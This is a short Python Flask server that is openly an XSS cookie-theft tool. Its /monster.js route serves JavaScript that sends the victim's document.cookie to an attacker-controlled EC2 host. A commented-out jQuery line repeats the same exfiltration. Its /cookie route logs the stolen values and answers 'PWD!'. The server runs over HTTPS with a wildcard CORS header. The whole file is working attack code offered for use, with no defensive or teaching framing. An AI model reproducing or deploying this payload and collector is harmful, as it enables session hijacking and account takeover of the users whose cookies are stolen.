#!/usr/bin/env python

from datetime import timedelta
from flask import make_response, request, current_app, request
from functools import update_wrapper
from flask import Flask
from OpenSSL import SSL
from urllib import unquote

import os
 
context = SSL.Context(SSL.SSLv23_METHOD)
cer = os.path.join(os.path.dirname(__file__), 'cert.crt')
key = os.path.join(os.path.dirname(__file__), 'cert.key')


app = Flask(__name__)


def crossdomain(origin=None, methods=None, headers=None,
                max_age=21600, attach_to_all=True,
                automatic_options=True):

    if methods is not None:
        methods = ', '.join(sorted(x.upper() for x in methods))
    if headers is not None and not isinstance(headers, basestring):
        headers = ', '.join(x.upper() for x in headers)
    if not isinstance(origin, basestring):
        origin = ', '.join(origin)
    if isinstance(max_age, timedelta):
        max_age = max_age.total_seconds()

    def get_methods():
        if methods is not None:
            return methods

        options_resp = current_app.make_default_options_response()
        return options_resp.headers['allow']

    def decorator(f):
        def wrapped_function(*args, **kwargs):
            if automatic_options and request.method == 'OPTIONS':
                resp = current_app.make_default_options_response()
            else:
                resp = make_response(f(*args, **kwargs))
            if not attach_to_all and request.method != 'OPTIONS':
                return resp

            h = resp.headers

            h['Access-Control-Allow-Origin'] = origin
            h['Access-Control-Allow-Methods'] = get_methods()
            h['Access-Control-Max-Age'] = str(max_age)
            if headers is not None:
                h['Access-Control-Allow-Headers'] = headers
            return resp

        f.provide_automatic_options = False
        return update_wrapper(wrapped_function, f)
    return decorator

@app.route('/monster.js')
@crossdomain(origin='*')
def _():
	return """
	window.location = 'https://ec2-54-213-38-238.us-west-2.compute.amazonaws.com/cookie?c=' + encodeURI(document.cookie);
	""",200, {"Content-Type": "application/javascript" }

	#$.get('https://ec2-54-213-38-238.us-west-2.compute.amazonaws.com/cookie', { c: document.cookie });

@app.route('/cookie')
@crossdomain(origin='*')
def __():
	print "Recieved request: " + str(request)
	print unquote(request.args.get('c')).decode('utf-8')
	return "PWD!"

if __name__ == "__main__":
	context = (cer, key)
	app.run(host="0.0.0.0", port=443, debug=True, ssl_context=context);

